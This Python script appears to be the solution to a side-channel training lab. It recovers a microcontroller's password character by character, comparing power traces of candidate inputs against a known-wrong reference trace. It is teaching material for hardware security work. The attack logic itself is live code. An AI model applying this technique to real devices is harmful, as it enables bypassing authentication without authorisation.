'''
    This is the solution for the SCA101 - Power Analysis for Password Bypass lab.
    Main idea: The MCU will have different power traces depending on what instructions it executes. 
    Approach: 
        1. generate a reference trace - which contains a password known to be wrong.
        2. generate a power trace for each possible character + the password found up to that point (initially will be empty).
        3. find the outlier: the character for which the power trace has the greated difference compared to the reference trace/
        4. append the outlier to the guessed password 
'''


import numpy as np

#the password can contain only these characters
valid_ch_list = "abcdefghijklmnopqrstuvwxyz0123456789 \x00"

guessed_pass = ""

#we know that the password is 5 characters long
for i in range(5):
    #capture the reference power trace - a known bad password - containing 0x00s
    ref_trace = cap_pass_trace(guessed_pass + "\x00\n")[0:500]
    max_diff = 0.0
    best_guessed_ch = ""
    
    #find the best character candidate against the reference power trace
    for ch in valid_ch_list:
        trace = cap_pass_trace(guessed_pass + ch + "\n")[0:500]
        diff = np.sum(np.abs(trace - ref_trace))
        
        if diff > max_diff:
            max_diff = diff
            best_guessed_ch = ch
    
    #build the password
    guessed_pass += best_guessed_ch
    
    print(guessed_pass)
